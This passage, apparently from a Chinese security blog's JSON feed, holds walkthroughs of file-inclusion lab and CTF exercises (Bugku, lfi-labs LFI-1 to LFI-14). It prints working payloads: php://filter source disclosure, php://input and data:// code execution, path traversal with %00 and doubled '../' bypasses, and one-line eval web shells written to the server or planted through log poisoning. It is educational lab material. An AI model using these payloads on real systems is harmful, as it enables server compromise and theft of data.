style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><code>resource=&lt;要过滤的数据流&gt;</code></td>\n<td style=\"text-align:left\">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>read=&lt;读链的筛选列表&gt;</code></td>\n<td style=\"text-align:left\">该参数可选。可以设定一个或多个过滤器名称，以管道符（ <code>|</code> ）分隔。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>write=&lt;写链的筛选列表&gt;</code></td>\n<td style=\"text-align:left\">该参数可选。可以设定一个或多个过滤器名称，以管道符（ <code>|</code> ）分隔。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>&lt;；两个链的筛选列表&gt;</code></td>\n<td style=\"text-align:left\">任何没有以  <code>read=</code>  或  <code>write=</code>  作前缀 的筛选器列表会视情况应用于读或写链。</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"第一题-bugku-文件包含\"><a class=\"markdownIt-Anchor\" href=\"#第一题-bugku-文件包含\">#</a> 第一题 Bugku - 文件包含</h1>\n<p>打开题目后映入眼帘的是一个超链接，显示要点击</p>\n<p><img src=\"image-20221020210102218.png\" alt=\"image-20221020210102218\"></p>\n<p>点击后发现是 <code>GET</code>  请求，参数是 <code>file</code> ，值是 <code>show.php</code> ，这很有文件包含的韵味。</p>\n<p><img src=\"image-20221020210129622.png\" alt=\"image-20221020210129622\"></p>\n<p>本题，我们要使用的是 <code>php://filter</code> ，说白了就是<strong>为了读取文件</strong>用的。</p>\n<p><strong>示例  php://filter/read=&lt;读链需要应用的过滤器列表&gt;</strong></p>\n<p>这个参数采用一个或以管道符  <code>|</code>  分隔的多个过滤器名称。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">/* 这会以大写字母输出 www.example.com 的全部内容 */</span><br><span class=\"line\">readfile(&quot;php://filter/read=string.toupper/resource=http://www.example.com&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">/* 这会和以上所做的一样，但还会用 base64 加密。 */</span><br><span class=\"line\">readfile(&quot;php://filter/read=string.toupper|string.base64/resource=http://www.example.com&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>由于前台的代码我们是可以看得到的，后台代码我们能看得到么？</p>\n<p>可以，前提是存在 <code>文件包含漏洞</code> ，且使用 GET 请求。</p>\n<p>然后使用 <code>php://filter/read=</code> ，配合 <code>conver.base64-encode/resource=xxxxx</code>  来提取后台的代码内容</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://114.67.175.224:11146/index.php?file=php://filter/read=convert.base64-encode/resource=show.php</span><br></pre></td></tr></table></figure>\n<p>得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">77u/PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LXdlYjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFnezRjMTVlZGZmZGEwNDkyYWI2MDM2OTA2NTVmNTUzZDdifQ0KPz4NCjwvaHRtbD4NCg== </span><br></pre></td></tr></table></figure>\n<p>解码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">ï»¿&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;Bugku-web&lt;/title&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!<span class=\"variable\">$_GET</span>[file])&#123;<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class=\"line\">\t<span class=\"variable\">$file</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">strstr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;../&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>, <span class=\"string\">&quot;tp&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;input&quot;</span>)||<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;data&quot;</span>))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;Oh no!&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">exit</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>); </span><br><span class=\"line\"><span class=\"comment\">//flag:flag&#123;4c15edffda0492ab603690655f553d7b&#125;</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>flag 已经出来：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;4c15edffda0492ab603690655f553d7b&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"第二题-php-input命令执行\"><a class=\"markdownIt-Anchor\" href=\"#第二题-php-input命令执行\">#</a> 第二题 php input 命令执行</h1>\n<p>点击 <code>click</code>  后会跳转到百度</p>\n<p><img src=\"image-20221020215322462.png\" alt=\"image-20221020215322462\"></p>\n<p>我们发现 URL 很特殊：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_input.php?file=http://www.baidu.com</span><br></pre></td></tr></table></figure>\n<p><code>GET</code>  请求，后面跟着一个 <code>URL</code> ，我们怀疑其存在文件包含漏洞。</p>\n<p>尝试输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_input.php?file=php://filter/read</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020215459804.png\" alt=\"image-20221020215459804\"></p>\n<p>显示 <code>hacker!</code> ，说明 <code>filter</code>  伪协议被过滤掉了，不能用</p>\n<p>我们使用 <code>input</code>  伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_input.php?file=php://input</span><br><span class=\"line\"></span><br><span class=\"line\">#发送POST请求，在POST参数里写上php代码</span><br><span class=\"line\">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020215715688.png\" alt=\"image-20221020215715688\"></p>\n<p>既然 phpinfo 成功执行，那么可以执行任意 php 语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_input.php?file=php://input</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php system(&quot;dir&quot;);?&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020215836378.png\" alt=\"image-20221020215836378\"></p>\n<p>使用 <code>php</code>  语句写入一个带一句话木马的文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//www.lfi.com/php/php_input.php?file=php://input</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#注意，下面写入一句话时，所用都使用单引号，特别是第二个参数不要用双引号</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">fputs</span>(<span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&#x27;mywebshell.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>), <span class=\"string\">&#x27;&lt;?php @eval($_POST[jack]);?&gt;&#x27;</span>);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>使用菜刀连接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/mywebshell.php</span><br></pre></td></tr></table></figure>\n<p>找到 <code>flag.php</code></p>\n<p><img src=\"image-20221020221400926.png\" alt=\"image-20221020221400926\"></p>\n<h1 id=\"第三题-zip协议\"><a class=\"markdownIt-Anchor\" href=\"#第三题-zip协议\">#</a> 第三题 zip 协议</h1>\n<p>打开第三题，我们发现是一个和上传有关的界面</p>\n<p><img src=\"image-20221020222841751.png\" alt=\"image-20221020222841751\"></p>\n<p>根据提示，我们可以上传 <code>jpg</code> 、 <code>png</code> 、 <code>zip</code></p>\n<p>那么我们选择上传一个包含有 <code>webshell.php</code>  的 <code>jpg</code>  压缩包</p>\n<p>将其打包后，把 <code>rar</code>  后缀改成 <code>jpg</code></p>\n<p><img src=\"image-20221020223009765.png\" alt=\"image-20221020223009765\"></p>\n<p>点击上传，发现后台已经成功接收。</p>\n<p><img src=\"image-20221020223343170.png\" alt=\"image-20221020223343170\"></p>\n<p>不过我们的目的是让其解析里面的 php 代码，我们需要使用到 zip 协议</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_zip.php?file=zip://C:\\phpStudyB\\WWW\\lfi-labs-master\\php\\uploads\\115a2563174161e1c5176e556e167ff8.jpg%23mywebshell</span><br></pre></td></tr></table></figure>\n<p>注意：使用 zip 协议时，无论上传的后缀名如何，都会当成一个 zip 看待。</p>\n<p>使用菜刀连接即可</p>\n<h1 id=\"第四题-data协议\"><a class=\"markdownIt-Anchor\" href=\"#第四题-data协议\">#</a> 第四题 data 协议</h1>\n<p>有文件包含漏洞， <code>GET</code>  请求，参数为 <code>file </code> ，我们尝试使用 <code>data</code>  协议插入 <code>php</code>  代码执行</p>\n<p>注意，data 协议有两种用法：</p>\n<ul>\n<li><code>data://text/plain, + 你想写入的php代码</code></li>\n<li><code>data://text/plain;base64, + xxxxxxxxx代码的base64编码xxxxxxxxx</code></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_data.php?file=data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020230032370.png\" alt=\"image-20221020230032370\"></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/php/php_data.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>\n<p>也是可以的。</p>\n<h1 id=\"第五题-利用操作系统特性绕过\"><a class=\"markdownIt-Anchor\" href=\"#第五题-利用操作系统特性绕过\">#</a> 第五题 利用操作系统特性绕过</h1>\n<p>在上传 <code>backdoor.php</code>  的时候，如果在后台中被强行加了个 <code>.html</code>  这样的后缀时</p>\n<p>我们可以考虑使用 <code>........</code> (256 个 <code>.</code> ) 和  <code>././././././</code> ( <code>128</code>  个 <code>./</code> ) 这样的形式进行绕过</p>\n<p>因为在 windows 中，不允许文件以 <code>.</code>  和 <code>/</code>  进行结尾，且长度最大为 <code>256</code> （ <code>linux</code>  是 <code>4069</code> ）。</p>\n",
            "tags": [
                "文件包含探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%B8%80%EF%BC%89/",
            "url": "https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%B8%80%EF%BC%89/",
            "title": "文件包含进阶（一）",
            "date_published": "2022-10-20T15:49:56.000Z",
            "content_html": "<h1 id=\"文件包含漏洞\"><a class=\"markdownIt-Anchor\" href=\"#文件包含漏洞\">#</a> 文件包含漏洞</h1>\n<h2 id=\"lfi-1\"><a class=\"markdownIt-Anchor\" href=\"#lfi-1\">#</a> LFI-1</h2>\n<p>查看后台源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>     <span class=\"keyword\">include</span>(<span class=\"string\">&quot;../common/header.php&quot;</span>);   <span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- <span class=\"keyword\">from</span> https:<span class=\"comment\">//pentesterlab.com/exercises/php_include_and_post_exploitation/course --&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">hint</span>(<span class=\"string\">&quot;will include the arg specified in the GET parameter \\&quot;page\\&quot;&quot;</span>); <span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;form action=<span class=\"string\">&quot;/LFI-1/index.php&quot;</span> method=<span class=\"string\">&quot;GET&quot;</span>&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">&quot;text&quot;</span> name=<span class=\"string\">&quot;page&quot;</span>&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;page&quot;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>请求 form 表单， <code>GET</code>  方式，请求 <code>index.php</code>  时，会调用 php 的 <code>include($_GET[&quot;page&quot;].&quot;.html&quot;);</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//www.lfi.com/LFI-1/?page=../phpinfo.php</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019234908422.png\" alt=\"image-20221019234908422\"></p>\n<h2 id=\"lfi-2\"><a class=\"markdownIt-Anchor\" href=\"#lfi-2\">#</a> LFI-2</h2>\n<p>参数是 <code>library</code></p>\n<p>由于 Hint 是 %00 截断，那么我们尝试：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-2/?library=../../../boot.ini%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020000125556.png\" alt=\"image-20221020000125556\"></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-2/?library=../../../phpinfo.php%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020000057865.png\" alt=\"image-20221020000057865\"></p>\n<p>那么我们可以任意文件包含，去包含 webshell.php</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-2/?library=../../../webshell.php%00</span><br></pre></td></tr></table></figure>\n<p>使用菜刀连接：</p>\n<p><img src=\"image-20221020000532196.png\" alt=\"image-20221020000532196\"></p>\n<p>从这题可以看到，文件包含本质是利用文件包含 <code>include</code> 、 <code>require</code>  等漏洞来进行<strong>文件上传</strong>或<strong>文件访问</strong></p>\n<h2 id=\"lfi-3\"><a class=\"markdownIt-Anchor\" href=\"#lfi-3\">#</a> LFI-3</h2>\n<p>查看 Hint</p>\n<p><img src=\"image-20221020000927815.png\" alt=\"image-20221020000927815\"></p>\n<p>查看后台源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>], -<span class=\"number\">4</span>, <span class=\"number\">4</span>) != <span class=\"string\">&#x27;.php&#x27;</span>)<span class=\"comment\">//从结尾倒数第四个开始，取4个长度</span></span><br><span class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You are not allowed to see source files!&#x27;</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>代码核心逻辑讲了：</p>\n<p>从 <code>GET</code>  获取到的 <code>file</code>  参数内容里截取倒数第 4 个开始，取 4 个长度的子字符串</p>\n<p>将此字符串和 <code>.php</code>  (4 个字符) 进行比较 ——</p>\n<ul>\n<li>如果相等则显示 “You are not allowed to see source files!”</li>\n<li>否则调用 <code>file_get_contents</code>  显示文件内容，或者如果是 <code>php</code>  的话前台浏览器会解析 <code>php</code>  代码</li>\n</ul>\n<p>那么，利用点就是 <code>过掉这个if条件判断</code> 。</p>\n<p>首先，我们先确定相对路径：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../boot.ini</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020001601472.png\" alt=\"image-20221020001601472\"></p>\n<p>然后将 <code>boot.ini</code>  替换成 <code>phpinfo.php</code> ，注意加 <code>/.</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php/.</span><br></pre></td></tr></table></figure>\n<p>查看页面源代码，成功解析 php 代码：</p>\n<p><img src=\"image-20221020002018746.png\" alt=\"image-20221020002018746\"></p>\n<p>理论上，可以用任何多余特殊字符绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php.</span><br><span class=\"line\">http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php+</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n<p>均成功解析 php</p>\n<h2 id=\"lfi-4\"><a class=\"markdownIt-Anchor\" href=\"#lfi-4\">#</a> LFI-4</h2>\n<p>直接查看源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$path</span> = <span class=\"string\">&#x27;includes/class_&#x27;</span>.<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;class&#x27;</span>]).<span class=\"string\">&#x27;.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$path</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>核心逻辑</strong>：</p>\n<p>拼接 <code>includes/class_</code>  + <code>经过addslashes处理的GET请求参数class</code>  +  <code>.php</code></p>\n<p>然后使用 <code>file_get_contents</code>  函数回显这个拼接路径文件</p>\n<p><strong>注意</strong>： <code>addslashes</code>  可以对 <code>双引号</code> 、 <code>单引号</code> 、 <code>反斜杠</code> 、 <code>NULL</code>  前面加一个 <code>反斜杠</code> 进行转义</p>\n<p>那么由于后面已经有 <code>.php</code> ，所以我们只需要构造 <code>phpinfo</code> ，并尝试相对路径：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-4/?class=../../../../../phpinfo</span><br></pre></td></tr></table></figure>\n<p>成功解析到 <code>php</code>  代码</p>\n<p><img src=\"image-20221020003703322.png\" alt=\"image-20221020003703322\"></p>\n<h2 id=\"lfi-5\"><a class=\"markdownIt-Anchor\" href=\"#lfi-5\">#</a> LFI-5</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">   <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;../&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br><span class=\"line\">   <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>))</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">       <span class=\"keyword\">include</span>(<span class=\"string\">&quot;pages/<span class=\"subst\">$file</span>&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">else</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">       <span class=\"keyword\">include</span>(<span class=\"string\">&quot;index.php&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到，此题将 <code>../</code>  过滤成 <code>空</code> ，一般过滤成空的，我们可以通过双写来绕过。</p>\n<p>那么有</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-5/?file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p>成功显示 <code>phpinfo</code>  界面</p>\n<p><img src=\"image-20221020004759481.png\" alt=\"image-20221020004759481\"></p>\n<h2 id=\"lfi-6\"><a class=\"markdownIt-Anchor\" href=\"#lfi-6\">#</a> LFI-6</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;page&quot;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>核心逻辑：</p>\n<p>使用 <code>POST</code>  来传递参数，和 <code>LFI-1</code>  差不多。</p>\n<p><img src=\"image-20221020005136900.png\" alt=\"image-20221020005136900\"></p>\n<p>那么可以构造：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">page=../../phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020005213444.png\" alt=\"image-20221020005213444\"></p>\n<p>如何在服务器上写入一句话木马文件呢？</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fputs</span>(<span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&#x27;myshell.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>),<span class=\"string\">&#x27;&lt;?php @eval($_POST[JACK]);?&gt;&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010044983.png\" alt=\"image-20221020010044983\"></p>\n<p>后续使用菜刀连接即可。</p>\n<h2 id=\"lfi-7\"><a class=\"markdownIt-Anchor\" href=\"#lfi-7\">#</a> LFI-7</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">library=../../../boot.ini%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010438974.png\" alt=\"image-20221020010438974\"></p>\n<p>构造：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">library=../../../phpinfo.php%00</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010511820.png\" alt=\"image-20221020010511820\"></p>\n<h2 id=\"lfi-8\"><a class=\"markdownIt-Anchor\" href=\"#lfi-8\">#</a> LFI-8</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">file=../../../../phpinfo.php/.</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010823561.png\" alt=\"image-20221020010823561\"></p>\n<h2 id=\"lfi-9\"><a class=\"markdownIt-Anchor\" href=\"#lfi-9\">#</a> LFI-9</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">class=../../../../../phpinfo</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020010958041.png\" alt=\"image-20221020010958041\"></p>\n<h2 id=\"lfi-10\"><a class=\"markdownIt-Anchor\" href=\"#lfi-10\">#</a> LFI-10</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011102011.png\" alt=\"image-20221020011102011\"></p>\n<h2 id=\"lfi-11\"><a class=\"markdownIt-Anchor\" href=\"#lfi-11\">#</a> LFI-11</h2>\n<p>这题使用了隐藏字段进行传递参数</p>\n<p><img src=\"image-20221020011255262.png\" alt=\"image-20221020011255262\"></p>\n<p>那么可以有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">stylepath=../../../../phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011208724.png\" alt=\"image-20221020011208724\"></p>\n<h2 id=\"lfi-12\"><a class=\"markdownIt-Anchor\" href=\"#lfi-12\">#</a> LFI-12</h2>\n<p>还是使用隐藏字段传递，只不过变成了 <code>GET</code>  型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-12/?stylepath=../../../../phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011415134.png\" alt=\"image-20221020011415134\"></p>\n<h2 id=\"lfi-13\"><a class=\"markdownIt-Anchor\" href=\"#lfi-13\">#</a> LFI-13</h2>\n<p>依旧是双写：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-13/?file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011537265.png\" alt=\"image-20221020011537265\"></p>\n<h2 id=\"lfi-14\"><a class=\"markdownIt-Anchor\" href=\"#lfi-14\">#</a> LFI-14</h2>\n<p>变成了 <code>POST</code>  型，使用双写绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">file=..././..././..././phpinfo.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020011651144.png\" alt=\"image-20221020011651144\"></p>\n<h2 id=\"包含日志文件获取webshell\"><a class=\"markdownIt-Anchor\" href=\"#包含日志文件获取webshell\">#</a> 包含日志文件获取 webshell</h2>\n<p><img src=\"image-20221020011757179.png\" alt=\"image-20221020011757179\"></p>\n<p>我们通过 <code>httpd-vhosts.conf</code>  可以知道：</p>\n<p><img src=\"image-20221020012214942.png\" alt=\"image-20221020012214942\"></p>\n<p>我们的网页日志存储在 <code>logs/dummy-host2.asdf-access.log</code>  中</p>\n<p>那么我们通过文件包含去请求一句话木马，看是否会留下痕迹？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-1/?page=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>\n<p>那我们构造：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-1/?page=<span class=\"meta\">&lt;?php @eval($_POST[jack]);?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>接着查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.lfi.com/LFI-1/?page=../../../Apache/logs/dummy-host2.asdf-access.log</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221020013521115.png\" alt=\"image-20221020013521115\"></p>\n<p>发现 <code>尖括号</code> 和 <code>空格</code> 会被 URL 编码，这时候我们使用 <code>BP</code>  抓包修改</p>\n<p><img src=\"image-20221020013627512.png\" alt=\"image-20221020013627512\"></p>\n<p><img src=\"image-20221020014143191.png\" alt=\"image-20221020014143191\"></p>\n",
            "tags": [
                "文件包含探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E7%BB%95%E8%BF%87%E8%BF%9B%E9%98%B6/",
            "url": "https://kiyomijin.github.io/2022/10/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E7%BB%95%E8%BF%87%E8%BF%9B%E9%98%B6/",
            "title": "XSS绕过进阶",
            "date_published": "2022-10-20T15:43:52.000Z",
